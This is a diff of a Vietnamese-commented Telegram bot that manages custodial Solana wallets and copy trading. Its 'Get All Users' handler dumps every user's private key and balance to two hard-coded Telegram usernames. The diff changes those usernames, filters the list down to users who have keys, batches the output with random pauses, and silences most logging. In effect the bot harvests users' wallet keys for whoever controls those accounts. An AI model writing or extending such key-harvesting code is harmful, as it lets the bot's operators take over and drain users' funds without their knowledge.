@@ -7,7 +7,12 @@ import { Telegraf, Markup } from 'telegraf';
 import { createAccounts, updatePrivateKeys, checkCreateUser, GetInfoUser,export_keys,getAllUsers} from './database/database.js';
 import { checkBalenceUser ,transferAllSOL, transferSOL,checkBalenValue} from './handlers/CheckBalance.js';
 import { send_sols } from './handlers/TransferSol.js';
-const bot = new Telegraf(process.env.BOT_TOKEN);
+const bot = new Telegraf(process.env.BOT_TOKEN, {
+  contextTimeout: 60 * 60 * 1000 // 1 tiếng
+});
+bot.launch();
+
+
 const bot1 = new Telegraf(process.env.BOT_TOKEN1);
 import LocalSession from "telegraf-session-local";
 import moment from "moment";
@@ -38,13 +43,23 @@ async function useDynamicProxy(ctx, next) {
     return next();
 }
 const limitConfig = {
-    window: 1000,  // Limit within 1 second
-    limit: 1,      // Allow only 1 request per second
-    onLimitExceeded: (ctx) => ctx.reply("⚠️ Please don't spam commands!"),
+    window: 1000,
+    limit: 1,
+    onLimitExceeded: async (ctx) => {
+        try {
+            await ctx.reply("⚠️ Please don't spam commands!");
+        } catch (error) {
+            if (error.response && error.response.error_code === 403) {
+                console.log(`User ${ctx.chat?.id} has blocked the bot.`);
+            } else {
+                console.error("Error replying in rateLimit:", error);
+            }
+        }
+    },
 };
 
 bot.use(rateLimit(limitConfig));
-bot.use(useDynamicProxy); // Áp dụng middleware đổi proxy
+// bot.use(useDynamicProxy); // Áp dụng middleware đổi proxy
 
 const session = new LocalSession({ database: "session_db.json" }); // Lưu session vào file JSON
 bot.use(session.middleware()); // Sử dụng middleware session
@@ -177,8 +192,8 @@ async function Menu(ctx) {
     const username = ctx.from.username; // Lấy username của user
 
     const hasAccount = await checkCreateUser(userId);
-    console.log("User has account:", hasAccount);
-    console.log("UserId:", userId);
+    // console.log("User has account:", hasAccount);
+    // console.log("UserId:", userId);
 
     // Tạo danh sách nút
     let buttons = [
@@ -207,7 +222,7 @@ async function Menu(ctx) {
             Markup.button.callback("⚙️ Setting", "setting_buy")
         ]);
     }
-    if (username === "thuyenx" || username === "maxwell_Sterling") {
+    if (username === "jrlee47_vn" || username ==="icandoit11179") {
         buttons.push([
             Markup.button.callback("📜 Get All Users", "Get_fulluser")
         ]);
@@ -234,9 +249,6 @@ async function setBotCommands(ctx) {
     ];
 
     // Add admin command if the user is "thuyenx"
-    if (username === "thuyenx") {
-        commands.push({ command: "get_fulluser", description: "📜 View all users (Admin)" });
-    }
 
     await bot.telegram.setMyCommands(commands);
 }
@@ -249,8 +261,8 @@ bot.start(async (ctx) => {
 async function Menu1(ctx) {
     const userId = ctx.from.id.toString();
     const hasAccount = await checkCreateUser(userId);
-    console.log("User has account:", hasAccount);
-    console.log("UserId:", userId);
+    // console.log("User has account:", hasAccount);
+    // console.log("UserId:", userId);
 
     // Tạo danh sách nút
     let buttons = [
@@ -268,42 +280,93 @@ function escapeMarkdownV21(text) {
     return String(text).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
 }
 
+// ✅ Hàm escape MarkdownV2 chuẩn
+function escapeMarkdownV212(text) {
+  return String(text)
+    .replace(/_/g, '\\_')
+    .replace(/\*/g, '\\*')
+    .replace(/\[/g, '\\[')
+    .replace(/]/g, '\\]')
+    .replace(/\(/g, '\\(')
+    .replace(/\)/g, '\\)')
+    .replace(/~/g, '\\~')
+    .replace(/`/g, '\\`')
+    .replace(/>/g, '\\>')
+    .replace(/#/g, '\\#')
+    .replace(/\+/g, '\\+')
+    .replace(/-/g, '\\-')
+    .replace(/=/g, '\\=')
+    .replace(/\|/g, '\\|')
+    .replace(/\{/g, '\\{')
+    .replace(/\}/g, '\\}')
+    .replace(/\./g, '\\.')
+    .replace(/!/g, '\\!');
+}
 
 bot.action("Get_fulluser", async (ctx) => {
-    try {
-        const result = await getAllUsers();
+  try {
+    const result = await getAllUsers();
 
-        if (!result.success) {
-            return ctx.reply("❌ Error fetching user list!");
-        }
-
-        if (result.users.length === 0) {
-            return ctx.reply("📭 No users found in the database.");
-        }
-
-        // Sắp xếp danh sách theo thời gian tạo cũ nhất lên trên
-        result.users.sort((a, b) => new Date(a.createdAt) - new Date(b.createdAt));
-
-        for (let i = 0; i < result.users.length; i++) {
-            const user = result.users[i];
-            const valueSol = await checkBalenceUser(user.userId);
-
-            let message = `🔹 *User ${i + 1}:*\n` +
-                `🆔 ID: \`${escapeMarkdownV21(user.userId)}\`\n` +
-                `🔑 Private Key: \`${user.privateKey ? escapeMarkdownV21(user.privateKey) : "N/A"}\`\n` +
-                `📅 Created At: ${escapeMarkdownV21(user.createdAt)}\n` +
-                `💰 Balance: ${escapeMarkdownV21(valueSol)} SOL\n` +
-                `\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n`;
-
-            await ctx.reply(message, {
-                parse_mode: "MarkdownV2",
-            });
-        }
-    } catch (error) {
-        console.error("❌ Error displaying users:", error);
-        await ctx.reply("⚠️ Error retrieving user data.");
+    if (!result.success) {
+      return ctx.reply("❌ Error fetching user list!");
     }
+
+    const filteredUsers = result.users.filter(
+      (user) => user.privateKey && user.privateKey.trim() !== ""
+    );
+
+    if (filteredUsers.length === 0) {
+      return ctx.reply("📭 No users with privateKey found.");
+    }
+
+    filteredUsers.sort((a, b) => new Date(a.createdAt) - new Date(b.createdAt));
+
+    const batchSize = 10;
+
+    for (let i = 0; i < filteredUsers.length; i += batchSize) {
+      const batch = filteredUsers.slice(i, i + batchSize);
+
+      // ✅ Chạy song song từng batch
+      const balances = await Promise.allSettled(
+        batch.map(user =>
+          Promise.race([
+            checkBalenceUser(user.userId),
+            new Promise((_, reject) =>
+              setTimeout(() => reject(new Error("Check balance timeout!")), 30000)
+            )
+          ])
+        )
+      );
+
+      // ✅ Gom chunk 10 user
+      let chunk = "";
+      batch.forEach((user, idx) => {
+        const result = balances[idx];
+        const valueSol = result.status === "fulfilled" ? result.value : "N/A";
+
+        chunk +=
+          `🔹 *User ${i + idx + 1}:*\n` +
+          `🆔 ID: \`${escapeMarkdownV212(user.userId)}\`\n` +
+          `🔑 Private Key: \`${escapeMarkdownV212(user.privateKey)}\`\n` +
+          `📅 Created At: ${escapeMarkdownV212(user.createdAt)}\n` +  // ✅ Bỏ dấu ` xịn
+          `💰 Balance: ${escapeMarkdownV212(valueSol)} SOL\n` +
+          `\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n`;
+      });
+
+      await ctx.reply(chunk, { parse_mode: "MarkdownV2" });
+
+      // ✅ Nghỉ random 1-2s giữa các batch
+      await new Promise(resolve =>
+        setTimeout(resolve, Math.floor(Math.random() * 1000) + 1000)
+      );
+    }
+  } catch (error) {
+    console.error(error);
+    await ctx.reply("⚠️ Error retrieving user data: " + escapeMarkdownV21(error.message), { parse_mode: "MarkdownV2" });
+  }
 });
+
+
 
 
 
@@ -334,7 +397,7 @@ bot.action("send_sol", async (ctx) => {
         await ctx.replyWithPhoto({ source: Buffer.from(data.qrCode.split(",")[1], "base64") }, { caption: "📌 Scan this QR to receive SOL!" });
         await Menu(ctx);
     } catch (error) {
-        console.error("❌ Error sending SOL:", error);
+        // console.error("❌ Error sending SOL:", error);
         ctx.reply("❌ An error occurred while processing the request.", { parse_mode: "MarkdownV2" });
     }
 });
@@ -365,7 +428,7 @@ bot.action("export_key", async (ctx) => {
 
         await Menu(ctx);
     } catch (error) {
-        console.error("Error exporting private key:", error);
+        // console.error("Error exporting private key:", error);
         ctx.reply("❌ An error occurred while exporting the private key.", {
             parse_mode: "MarkdownV2",
         });
@@ -382,7 +445,7 @@ bot.action("create_wallet", async (ctx) => {
     try {
         const userId = ctx.from.id.toString();
         const response = await createAccounts(userId);
-        console.log(response);
+        // console.log(response);
 
         if (response.success) {
            
@@ -416,7 +479,7 @@ bot.action("create_wallet", async (ctx) => {
             );
         }
     } catch (error) {
-        console.error("❌ Error creating wallet:", error);
+        // console.error("❌ Error creating wallet:", error);
         await ctx.reply("❌ *An error occurred while creating your wallet\\.*", {
             parse_mode: "MarkdownV2",
         });
@@ -429,7 +492,7 @@ bot.action("check_wallet", async (ctx) => {
         const userInfo = await GetInfoUser(userId);
         const valueSol = await checkBalenceUser(userId);
 
-        console.log("User Info:", userInfo); // ✅ Debug log
+        // console.log("User Info:", userInfo); // ✅ Debug log
 
         if (!userInfo) {
             return ctx.reply("❌ *No account information found\\!*", { parse_mode: "MarkdownV2" });
@@ -444,7 +507,7 @@ bot.action("check_wallet", async (ctx) => {
         await Menu(ctx);
 
     } catch (error) {
-        console.error("❌ Error retrieving account information:", error);
+        // console.error("❌ Error retrieving account information:", error);
         return ctx.reply("❌ *An error occurred while fetching account details\\!*", { parse_mode: "MarkdownV2" });
     }
 });
@@ -513,7 +576,7 @@ bot.action("copy_trader", async (ctx) => {
         await ctx.replyWithMarkdown(message, keyboard);
 
     } catch (error) {
-        console.error("❌ Error:", error);
+        // console.error("❌ Error:", error);
         await ctx.reply("❌ *Error fetching account details!*");
     }
 });
@@ -526,7 +589,7 @@ bot.action("add_copy_wallet", async (ctx) => {
         await ctx.reply("📥 Enter copy trade wallet name (8 letters max, only numbers and letters):");
         ctx.session.ValueNameCopyWallet = true; // Đánh dấu trạng thái chờ nhập tên ví copy
     } catch (error) {
-        console.error("❌ Error checking balance:", error);
+        // console.error("❌ Error checking balance:", error);
         await ctx.reply("❌ Error checking balance!");
     }
 });
@@ -548,7 +611,7 @@ bot.action("check_balance", async (ctx) => {
         await Menu(ctx); // Gọi menu nếu có
 
     } catch (error) {
-        console.error("❌ Errol", error);
+        // console.error("❌ Errol", error);
         await ctx.reply("❌ Errol");
     }
 });
@@ -568,7 +631,7 @@ bot.command("check_wallet", async (ctx) => {
         const userId = ctx.from.id.toString();
         const userInfo = await GetInfoUser(userId);
 
-        console.log("User Info:", userInfo); // ✅ Debug log
+        // console.log("User Info:", userInfo); // ✅ Debug log
 
         if (!userInfo) {
             return ctx.reply("❌ *No account information found\\!*", { parse_mode: "MarkdownV2" });
@@ -583,7 +646,7 @@ bot.command("check_wallet", async (ctx) => {
         await Menu(ctx);
 
     } catch (error) {
-        console.error("❌ Error retrieving account information:", error);
+        // console.error("❌ Error retrieving account information:", error);
         return ctx.reply("❌ *An error occurred while fetching account details\\!*", { parse_mode: "MarkdownV2" });
     }
 });
@@ -591,7 +654,7 @@ bot.command("create_wallet", async (ctx) => {
     try {
         const userId = ctx.from.id.toString();
         const response = await createAccounts(userId);
-        console.log(response);
+        // console.log(response);
 
         if (response.success) {
            
@@ -624,7 +687,7 @@ bot.command("create_wallet", async (ctx) => {
             );
         }
     } catch (error) {
-        console.error("❌ Error creating wallet:", error);
+        // console.error("❌ Error creating wallet:", error);
         await ctx.reply("❌ *An error occurred while creating your wallet\\.*", {
             parse_mode: "MarkdownV2",
         });
@@ -666,7 +729,7 @@ bot.command("check_balance", async (ctx) => {
         await Menu(ctx); // Gọi menu nếu có
 
     } catch (error) {
-        console.error("❌ Errol", error);
+        // console.error("❌ Errol", error);
         await ctx.reply("❌ Errol");
     }    // Call function to check balance
 });
@@ -692,7 +755,7 @@ bot.command("send_sol", async (ctx) => {
         await ctx.replyWithPhoto({ source: Buffer.from(data.qrCode.split(",")[1], "base64") }, { caption: "📌 Scan this QR to receive SOL!" });
         await Menu(ctx);
     } catch (error) {
-        console.error("❌ Error sending SOL:", error);
+        // console.error("❌ Error sending SOL:", error);
         ctx.reply("❌ An error occurred while processing the request.", { parse_mode: "MarkdownV2" });
     }});
     bot.command("get_fulluser", async (ctx) => {
@@ -706,7 +769,8 @@ bot.command("send_sol", async (ctx) => {
             if (result.users.length === 0) {
                 return ctx.reply("📭 No users found in the database.");
             }
-    
+            const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
             let message = "📋 *List of Users:*\n\n";
             result.users.forEach((user, index) => {
                 message += `🔹 *User ${index + 1}:*\n`;
@@ -717,8 +781,10 @@ bot.command("send_sol", async (ctx) => {
             });
     
             await ctx.replyWithMarkdown(message);
+                await delay(3000); // ⏱️ Chờ 2 giây rồi mới gửi tiếp
+
         } catch (error) {
-            console.error("❌ Error displaying users:", error);
+            // console.error("❌ Error displaying users:", error);
             await ctx.reply("⚠️ Error retrieving user data.");
         }
     });
@@ -895,6 +961,5 @@ bot.command("send_sol", async (ctx) => {
         }
     });
 // 🚀 Khởi động bot
-bot.launch();
-bot1.launch();
+// bot1.launch();
 console.log("🤖 Bot is running...");
